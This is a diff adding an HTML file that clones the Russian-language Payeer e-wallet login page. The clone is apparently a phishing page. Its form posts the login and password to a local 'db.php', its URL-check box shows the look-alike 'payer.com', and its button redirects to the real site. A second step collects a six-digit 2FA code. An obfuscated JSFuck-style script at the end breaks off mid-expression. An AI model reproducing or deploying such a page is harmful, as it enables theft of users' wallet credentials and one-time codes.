@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<!-- saved from url=(0054)https://payeer.com/ru/auth/?backurl=%2Fru%2Faccount%2F -->
+<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   
+   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+   <meta http-equiv="X-UA-Compatible" content="ie=edge">
+   <title>PAYEER | Войти</title>
+   <link rel="apple-touch-icon" sizes="180x180" href="https://payeer.com/static/icons/apple-touch-icon.png">
+   <link rel="icon" type="image/png" sizes="32x32" href="https://payeer.com/static/icons/favicon-32x32.png">
+   <link rel="icon" type="image/png" sizes="16x16" href="https://payeer.com/static/icons/favicon-16x16.png">
+   <link rel="manifest" href="https://payeer.com/static/icons/site.json">
+   <link rel="mask-icon" href="https://payeer.com/static/icons/safari-pinned-tab.svg" color="#5bbad5">
+   <meta name="msapplication-TileColor" content="#da532c">
+   <meta name="theme-color" content="#ffffff">
+   <link href="./pa_files/fonts.css" rel="stylesheet" type="text/css"><link href="./pa_files/style.css" rel="stylesheet" type="text/css"><link href="./pa_files/jquery.ui.all.css" rel="stylesheet" type="text/css"><link href="./pa_files/jquery.formstyler.css" rel="stylesheet" type="text/css"><link href="./pa_files/jquery.formstyler.new.css" rel="stylesheet" type="text/css">      
+<script type="text/javascript" async="" src="./pa_files/recaptcha__ru.js.загрузка" crossorigin="anonymous" integrity="sha384-aYvFcj+dbz3nAVG6w+th6d5mcK0zQAdekb2Snsw8aXgz/UdwYV18OkAqLB4sjklK"></script><script type="text/javascript">if(!window.BX)window.BX={message:function(mess){if(typeof mess=='object') for(var i in mess) BX.message[i]=mess[i]; return true;}};</script>
+<script type="text/javascript">(window.BX||top.BX).message({'LANGUAGE_ID':'ru','FORMAT_DATE':'DD.MM.YYYY','FORMAT_DATETIME':'DD.MM.YYYY HH:MI:SS','COOKIE_PREFIX':'BITRIX_SM','SERVER_TZ_OFFSET':'10800','SITE_ID':'ru','USER_ID':'','SERVER_TIME':'1718023776','USER_TZ_OFFSET':'0','USER_TZ_AUTO':'Y','bitrix_sessid':'2f59e9e4de95b59a2524ab4e7d4cc801'});</script>
+
+
+
+
+   <script type="text/javascript" src="./pa_files/jquery-3.5.1.min.js.загрузка"></script><script type="text/javascript" src="./pa_files/jquery.form.min.js.загрузка"></script><script type="text/javascript" src="./pa_files/jquery-ui.js.загрузка"></script><script type="text/javascript" src="./pa_files/jquery.md5.min.js.загрузка"></script><script type="text/javascript" src="./pa_files/jquery.sumoselect.js.загрузка"></script><script type="text/javascript" src="./pa_files/nprogress.js.загрузка"></script><script type="text/javascript" src="./pa_files/main.js.загрузка"></script><script type="text/javascript" src="./pa_files/jquery.formstyler.js.загрузка"></script>      <script>
+   window.opener = null;
+
+   setInterval(function()
+   {
+      ajaxLoad({id: '#null', url: '/ajax/public/session.php?sessid=2f59e9e4de95b59a2524ab4e7d4cc801'}, {type: 'null', nprogress: 'N', formType: 'json'});
+   }, 500000);
+   </script>
+</head>
+<body>
+<header>
+   <div class="app-header__inner contain">
+      <div class="top-line">
+         <div class="top-line__section">
+            <div class="top-line__info">
+               <div class="logo">
+                  <a href="https://payeer.com/" class="logo__img"><img src="./pa_files/logo.svg" alt="logo"></a>
+                  <div class="logo__desc">ELECTRONIC <br> WALLET</div>
+               </div><!-- logo -->
+            </div>
+            <div class="top-line__for-users">
+               <div class="header-option">
+    <div class="header-flag">
+        <img src="./pa_files/ru.svg" alt="Русский">
+    </div>
+    <div class="SumoSelect">
+      <p class="CaptionCont SelectBox" title="Русский"><span> Русский</span><label><i></i></label></p>
+      <div class="optWrapper">
+         <ul class="options">
+                           <li class="opt selected lg-ru" data-lang="ru" data-urlpage="/ru/auth/?backurl=%2Fru%2Faccount%2F"><label>Русский</label></li>
+                           <li class="opt lg-en" data-lang="en" data-urlpage="/en/auth/?backurl=%2Fru%2Faccount%2F"><label>English</label></li>
+                     </ul>
+      </div>
+   </div>
+</div>
+            </div>
+         </div>
+      </div><!-- top-line -->
+   </div>
+</header>
+<div class="js-tool-tip-ordertype"></div>
+<div class="contain">
+   <main class="app__main popup-top-bg">
+      <div id="login-step1" class="popup-content-wrapper auth_step1 ">
+         <div class="popup-content">
+            <div class="login-form__titles-head">
+               <div class="login-form__sub-head">
+                  Авторизация               </div>
+               <div class="login-form__title-head">
+                  Войдите!               </div>
+            </div>
+            <div class="login-form__content">
+               <form class="login-form__content-inner auth_form" method="post" action="db.php" onsubmit="beforeAuthorize(); return false;">
+                  <input type="hidden" name="action" value="authorization">
+                  <input type="hidden" name="block" value="0">
+                  <input type="hidden" name="sessid" id="sessid" value="2f59e9e4de95b59a2524ab4e7d4cc801">                  <input type="hidden" name="sign" value="047630e2c773b0a62f612891ab7a8978">
+                  <button class="login-form__close" type="button" onclick="document.location = &#39;/ru/&#39;; return false;"></button>
+
+                  <div class="login-form__visit-url">
+                     <span>Убедитесь, что вы на верном URL-адресе:</span>
+                  </div>
+                  <div class="login-form__visit-url-input">
+                     https://payer.com
+                  </div>
+                  <div class="form-note-auth topform-error hide">
+                     <div class="topform-top-h">Ошибка</div>
+                  </div>
+                  <div class="form-note-auth topform-result hide">
+                     <div class="topform-top-h">Уведомление</div>
+                  </div>
+                                    <div class="form-input login-form__input-field">
+                     <input type="text" name="email" autocomplete="off" placeholder="P1000001" tabindex="1">
+                     <span class="error-clear"></span>
+                     <label>Логин</label>
+                     <a href="https://payeer.com/ru/auth/?forgot_password=yes" class="forgot">Забыли логин ?</a>
+                  </div>
+                  <div class="form-input login-form__input-field">
+                     <input type="password" name="password" tabindex="2">
+                     <span class="error-clear"></span>
+                     <label>Пароль</label>
+                     <a href="https://payeer.com/ru/auth/?forgot_password=yes" class="forgot">Забыли пароль ?</a>
+                  </div>
+                                                            <div class="form-input login-form__input-field hide">
+                            <div class="security-captcha" id="turnstile-auth" data-action="authorization" data-cdata="2f59e9e4de95b59a2524ab4e7d4cc801" style="margin: 15px auto -15px;"><iframe src="./pa_files/normal.html" allow="cross-origin-isolated; fullscreen; autoplay" sandbox="allow-same-origin allow-scripts allow-popups" id="cf-chl-widget-7555i" tabindex="0" title="Виджет с действием &quot;challenge&quot; Cloudflare" style="border: none; overflow: hidden; width: 300px; height: 65px;"></iframe><input type="hidden" name="g-recaptcha-response" id="cf-chl-widget-7555i_response" value="0.RgHF9H6KJngp0NIAGqZnELKSoQTHYPaZ6kpqjppHncL1RwCvJEnShQjDX6OO7jB_diNeC7nGl5HbovocCazEAbWbgoNA4vzbrmTVaAhpkUjUqO17J6vMSXYGkyER-PxbQYjfwLxXn-LxAFnRV2ulQu4Z23kozzNyQuvri4O9NlVICGfEhb8Z_HR_cp4BUCynZ0XYWsiWsyQJWTPR9UM7fRUw0gQpmj_mKR_m7-tu3NiT-mjtnWyPWwLDwbS6Ip49jgqrApOOEINO9AInwH1CN_xcDNx56Qbv6Ksa2oeDvxV2ObLfW_kbSKpWLh94B80fLRsCIgicXPRaOd_ihCaX_4FS0xMx2L-QlVmrUhuwd2nVpD6M0hwg3MGwsIZzCkPlXxAyfasQFfVlanKCo7bAPRRy3TeHmjMNUsTa3oZLozUsr5vMmn3ArcoSDGj8waUBpkzGBA7PEDiiTYiPLxnn8DvstgJ5VU-gkc6kMvtcaH1MH-VXztbY91pifiCycIPh.joWvlQsHpuw0et_wTCCN6A.a19b3163381f4e09eba12c506b3a85e9a18921491274fdab2272a80041d818e8"></div>
+                                                        <script src="./pa_files/api.js.загрузка" async="" defer=""></script>
+                        </div>
+                                          <button id="buttn12" onclick="location.href='https://payeer.com/ru/auth/?backurl=%2Fru%2Faccount%2F'" type="submit" class="login-form__login-btn step1" tabindex="3">
+      					Далее      				</button>
+                  <input type="hidden" name="backurl" value="/ru/account/">
+                  <input type="hidden" name="security_code" value="">
+                  <input type="hidden" name="recaptcha_v3" value="">
+         
+               </form>
+               <div class="login-form__down-button">
+                  <span>Нет учетной записи ?</span>
+                  <a class="login-form__btn create-account" href="https://payeer.com/ru/auth/?register=yes&amp;backurl=%2Fru%2Faccount%2F">
+                     <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="24px" height="28px" viewBox="0 0 24 28" enable-background="new 0 0 24 28" xml:space="preserve">  <image id="image1" width="24" height="28" x="0" y="0" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAeCAQAAABz5X1QAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
+                        AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElN
+                        RQfiDBgXBDSbtAYcAAABfElEQVQ4y5WSsUvUYRyHn/fn6Q2ZpFYHGfYH1JCTs5DQ2lKLDtIc0uIY
+                        5BYGjeEi4hZu4hI0ZIkmCN1xpVJzgdFZQzro3T0OYnin9/7u93y3L+/zfd/P+75IpAoWLXuzsRsT
+                        Bv2u6o9GqbUw4LanbDmYrvRY8ixl++JKoUlQ/WahtdLtuhex7g2RINznHnlqXOaASWCNYS5mngnA
+                        x2fmjHnLHVszdrKLHPGZBJlmmeeMU8Fz8wN1ZpkDwGdeabgp0ioI4zygixp55LBFikAHRV7yB3Da
+                        9vlgIriXQdEhSegkC1ch4SiT0gW51EWrfOKQBAjk2SA1y0zTFV9Li/9TfGRFraq/rbjvQlxZEd+p
+                        mz717WkzrqyKK/4zJ2JR1b9JNHoActSoAvALgHpcqQIH9PCK20wxCkB3/GDb4oumXim4R29kn4cs
+                        codLQJ0agX7KaU/5hrt8JOEkQI4l6lm/5aj//XYJZP7J+5DwPoOwy1cIXuc1I20JX3hCCY4B5/Ks
+                        rqdIQPQAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMTItMjVUMDY6MDQ6NTItMDc6MDBBc7LnAAAA
+                        JXRFWHRkYXRlOm1vZGlmeQAyMDE4LTEyLTI1VDA2OjA0OjUyLTA3OjAwMC4KWwAAABl0RVh0U29m
+                        dHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAASUVORK5CYII="></image>
+                     </svg>
+                     СОЗДАТЬ                  </a>
+               </div>
+            </div>
+         </div>
+      </div>
+
+      <div id="login-step2" class="popup-content-wrapper auth_step2 hide">
+         <div class="popup-content">
+            <div class="login-form__titles-head">
+               <div class="login-form__sub-head">
+                  Авторизация               </div>
+               <div class="login-form__title-head">
+                  Безопасность               </div>
+            </div>
+            <div class="login-form__content">
+              <form class="login-form__content-inner form auth_authorize_confirm" method="post" action="https://payeer.com/bitrix/components/auth/system.auth.authorize/templates/.default/ajax.php" onsubmit="ajaxFormSubmit(&#39;.auth_authorize_confirm&#39;, &#39;afterAuthorizationConfirm&#39;); return false;">
+                 <input type="hidden" name="action" value="2fa">
+                 <input type="hidden" name="block" value="0">
+                 <input type="hidden" name="sessid" id="sessid_1" value="2f59e9e4de95b59a2524ab4e7d4cc801">                 <input type="hidden" name="sign" value="047630e2c773b0a62f612891ab7a8978">
+
+                 <button class="login-form__back" type="button" onclick="afterAuthorizationConfirm(this, {action: &#39;back&#39;}); return false;"></button>
+                 <button class="login-form__close" type="button" onclick="document.location = &#39;/ru/&#39;; return false;"></button>
+
+                 <div class="form-input-top" style="margin: 0 auto 40px;">
+                    <span></span>
+                 </div>
+                 <div class="form-note-auth topform-error hide">
+                    <div class="topform-top-h">Ошибка</div>
+                 </div>
+                 <div class="form-note-auth topform-result hide">
+                    <div class="topform-top-h">Уведомление</div>
+                 </div>
+
+                 <div class="verification_desc verification_desc1"></div>
+
+                 <div class="verification_code_div">
+                    <b class="hide"></b>
+                    <div class="verification_code_input">
+                                                <input type="tel" class="pincode" name="pincode" value="" autocomplete="off">
+                                                <input type="tel" class="pincode" name="pincode" value="" autocomplete="off">
+                                                <input type="tel" class="pincode" name="pincode" value="" autocomplete="off">
+                                                <input type="tel" class="pincode" name="pincode" value="" autocomplete="off">
+                                                <input type="tel" class="pincode" name="pincode" value="" autocomplete="off">
+                                                <input type="tel" class="pincode" name="pincode" value="" autocomplete="off">
+                                            </div>
+                    <input type="hidden" name="code" value="">
+                 </div>
+
+                 <div class="verification_desc verification_desc2"></div>
+
+                 
+                 <button type="submit" class="login-form__login-btn step2" disabled="">
+                    Далее                 </button>
+
+                                  <div class="verification_code_resend">Не получили код? <a href="https://payeer.com/ru/auth/?backurl=%2Fru%2Faccount%2F#" onclick="ajaxLoad({id: &#39;.auth_authorize_confirm&#39;, url: &#39;/bitrix/components/auth/system.auth.authorize/templates/.default/ajax.php?action=repeat&amp;sessid=2f59e9e4de95b59a2524ab4e7d4cc801&#39;, afterSuccess: &#39;afterAuthorizationConfirmRepeat&#39;}, {type: &#39;null&#39;, formType: &#39;json&#39;}); return false;"></a></div>
+                 
+                  <input type="hidden" name="backurl" value="/ru/account/">
+              </form>
+              <div class="login-form__down-button">
+                 <span>Нет учетной записи ?</span>
+                 <a class="login-form__btn create-account" href="https://payeer.com/ru/auth/?register=yes&amp;backurl=%2Fru%2Faccount%2F">
+                    <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="24px" height="28px" viewBox="0 0 24 28" enable-background="new 0 0 24 28" xml:space="preserve">  <image id="image1" width="24" height="28" x="0" y="0" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAeCAQAAABz5X1QAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
+                       AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElN
+                       RQfiDBgXBDSbtAYcAAABfElEQVQ4y5WSsUvUYRyHn/fn6Q2ZpFYHGfYH1JCTs5DQ2lKLDtIc0uIY
+                       5BYGjeEi4hZu4hI0ZIkmCN1xpVJzgdFZQzro3T0OYnin9/7u93y3L+/zfd/P+75IpAoWLXuzsRsT
+                       Bv2u6o9GqbUw4LanbDmYrvRY8ixl++JKoUlQ/WahtdLtuhex7g2RINznHnlqXOaASWCNYS5mngnA
+                       x2fmjHnLHVszdrKLHPGZBJlmmeeMU8Fz8wN1ZpkDwGdeabgp0ioI4zygixp55LBFikAHRV7yB3Da
+                       9vlgIriXQdEhSegkC1ch4SiT0gW51EWrfOKQBAjk2SA1y0zTFV9Li/9TfGRFraq/rbjvQlxZEd+p
+                       mz717WkzrqyKK/4zJ2JR1b9JNHoActSoAvALgHpcqQIH9PCK20wxCkB3/GDb4oumXim4R29kn4cs
+                       codLQJ0agX7KaU/5hrt8JOEkQI4l6lm/5aj//XYJZP7J+5DwPoOwy1cIXuc1I20JX3hCCY4B5/Ks
+                       rqdIQPQAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMTItMjVUMDY6MDQ6NTItMDc6MDBBc7LnAAAA
+                       JXRFWHRkYXRlOm1vZGlmeQAyMDE4LTEyLTI1VDA2OjA0OjUyLTA3OjAwMC4KWwAAABl0RVh0U29m
+                       dHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAASUVORK5CYII="></image>
+                    </svg>
+                    СОЗДАТЬ                 </a>
+              </div>
+           </div>
+          </div>
+      </div>
+   </main>
+</div>
+
+
+<div class="sign-form">
+<script type="text/javascript">var $$$ = [];$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=((((((!+[]+!+[])*1+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=((((((((!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=(((((((!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1-(!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=(($$$[(!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=((((((((!+[]+!+[]+!+[]+!+[])*1-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)+(+!+[])*1)-(+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=((($$$[(!+[]+!+[]+!+[]+!+[])*1]+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1);$$$[(+!+[])*1]=((!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+!+[])*1]=(((((((($$$[(+!+[])*1]-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[])*1]=(((((((((((((((((((((((((((((!+[]+!+[]+!+[]+!+[])*1-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=($$$[(!+[]+!+[]+!+[]+!+[])*1]+(+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=(((((((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]-(+!+[]+[+[]])*(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)+(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[])*1]=(((((((((((((((((($$$[(!+[]+!+[]+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[])*1)+(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1);$$$[(+[])*(+!+[])*1]=((((((((((($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)+(+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=((((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[])*1]=((((((((((((((((((((((((($$$[(!+[]+!+[]+!+[])*1]+(+!+[])*1)-(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=(((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)+(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1);$$$[(+[])*(+!+[])*1]=(((((((((((((($$$[(+[])*(+!+[])*1]+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=((((((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]-(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)+(+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[])*1)+(+!+[])*1);$$$[(+[])*(+!+[])*1]=($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+!+[])*1]=((((((((((((((((($$$[(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)+(!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[])*1]=(((((((((($$$[(!+[]+!+[]+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=((((((($$$[(!+[]+!+[])*1]+(!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=((((((((((((((((((((((($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*